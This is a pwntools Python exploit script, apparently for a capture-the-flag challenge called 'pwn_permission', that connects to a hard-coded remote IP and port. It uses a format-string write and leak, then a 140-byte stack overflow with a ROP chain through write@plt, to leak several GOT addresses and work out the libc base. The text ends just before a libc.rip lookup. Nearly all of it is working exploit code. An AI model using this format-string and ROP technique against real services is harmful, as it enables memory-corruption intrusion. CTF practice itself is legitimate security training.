from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# Key insight: write@plt works but libc write doesn't
# This means the libc offsets might be slightly off
# Let me verify by leaking the actual write@GOT value

target_val_addr = 0x804c030
puts_got = elf.got['puts']
write_got = elf.got['write']
read_got = elf.got['read']
got_base = 0x804c000
bss_buf = 0x804c040
write_plt = elf.plt['write']
pop4ret = 0x8049380

PUTS_OFFSET = 0x6d1e0

fmt_payload = b'%5c%7$hhnAAA'
fmt_payload += p32(target_val_addr)
fmt_payload += p32(puts_got)
fmt_payload += b'%8$s'

import time

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

log.info(f"libc base: 0x{libc_base:x}")
log.info(f"puts: 0x{puts_leak:x}")

# Leak write@GOT and read@GOT using write@plt (which works!)
payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
# Leak write@GOT
payload += p32(write_plt)
payload += p32(pop4ret)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)

conn.send(payload)
time.sleep(1)

try:
    write_leak = u32(conn.recv(4, timeout=3))
    write_offset = write_leak - libc_base
    log.info(f"write@libc: 0x{write_leak:x} (offset: 0x{write_offset:x})")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()

# Now leak read@GOT
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
payload += p32(write_plt)
payload += p32(pop4ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

conn.send(payload)
time.sleep(1)

try:
    read_leak = u32(conn.recv(4, timeout=3))
    read_offset = read_leak - libc_base
    log.info(f"read@libc: 0x{read_leak:x} (offset: 0x{read_offset:x})")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()

# Now leak printf@GOT
printf_got = elf.got['printf']
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
payload += p32(write_plt)
payload += p32(pop4ret)
payload += p32(1)
payload += p32(printf_got)
payload += p32(4)

conn.send(payload)
time.sleep(1)

try:
    printf_leak = u32(conn.recv(4, timeout=3))
    printf_offset = printf_leak - libc_base
    log.info(f"printf@libc: 0x{printf_leak:x} (offset: 0x{printf_offset:x})")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()

# Now let me also leak __libc_start_main@GOT
lsm_got = elf.got['__libc_start_main']
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

payload = b'A' * 140
payload += p32(got_base)
payload += p32(bss_buf)
payload += p32(write_plt)
payload += p32(pop4ret)
payload += p32(1)
payload += p32(lsm_got)
payload += p32(4)

conn.send(payload)
time.sleep(1)

try:
    lsm_leak = u32(conn.recv(4, timeout=3))
    lsm_offset = lsm_leak - libc_base
    log.info(f"__libc_start_main@libc: 0x{lsm_leak:x} (offset: 0x{lsm_offset:x})")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()

# Now query libc.rip with the exact offsets
log.info("\n=== Querying libc.rip with exact offsets ===")
import requests
api_url = "https://libc.rip/api/find"

# Use the offsets we just leaked
# puts: 0x6d1e0 (already known)
# We need to add the other offsets after we get them